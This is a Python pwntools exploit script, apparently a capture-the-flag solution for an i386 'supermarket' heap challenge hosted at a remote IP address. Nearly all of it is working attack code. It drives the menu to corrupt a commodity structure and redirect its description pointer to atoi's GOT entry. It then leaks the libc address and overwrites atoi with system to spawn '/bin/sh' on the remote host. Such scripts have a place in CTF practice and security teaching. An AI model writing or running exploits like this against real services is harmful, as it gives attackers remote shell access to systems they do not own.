from pwn import *
from LibcSearcher import *
import time
context(arch='i386', os='linux', log_level='debug')

elf = ELF('./supermarket')
libc0 = ELF('./libc.so.6')
# io = process('./supermarket')
io = remote('111.200.241.244', 57899)

def add_commodity(name, price, descrip_size, description):
	io.sendlineafter(b'your choice>> ', b'1')
	io.sendlineafter(b'name:', name)
	io.sendlineafter(b'price:', str(price).encode())
	io.sendlineafter(b'descrip_size:', str(descrip_size).encode())
	io.sendlineafter(b'description:', description)

def list_commodities():
	io.sendlineafter(b'your choice>> ', b'3')

def change_description(name, descrip_size, description):
	io.sendlineafter(b'your choice>> ', b'5')
	io.sendlineafter(b'name:', name)
	io.sendlineafter(b'descrip_size:', str(descrip_size).encode())
	io.sendlineafter(b'description:', description)


add_commodity(b'aaa', 100, 0x80, b'AAA')
add_commodity(b'bbb', 200, 10, b'BBB')
# make original space freed
change_description(b'aaa', 0x90, b'')
add_commodity(b'ccc', 999, 10, b'CCC')
# the 2nd argument shouldn't be bigger than 0x80 because if the size is bigger, then program will free this chunk but this chunk has already been freed, causing double free error
change_description(b'aaa', 0x10, b'ccc'.ljust(16, b'\x00') + p32(512) + p32(0x10) + p32(elf.got['atoi']))

list_commodities()

mem_atoi_addr = u32(io.recvuntil(b'\n---------menu', drop = True)[-5:-1])
# print(hex(mem_atoi_addr))

# libc = LibcSearcher('atoi', mem_atoi_addr)
# libc_atoi_addr = libc.dump('atoi')
# offset = mem_atoi_addr - libc_atoi_addr
# libc_sys_addr = libc.dump('system')
# mem_sys_addr = offset + libc_sys_addr
# print(hex(mem_sys_addr))

offset2 = mem_atoi_addr - libc0.symbols['atoi']
mem_sys_addr2 = offset2 + libc0.symbols['system']

change_description(b'ccc', 0x10, p32(mem_sys_addr2))
io.interactive()
io.sendlineafter(b'your choice>> ', b'/bin/sh')

io.interactive()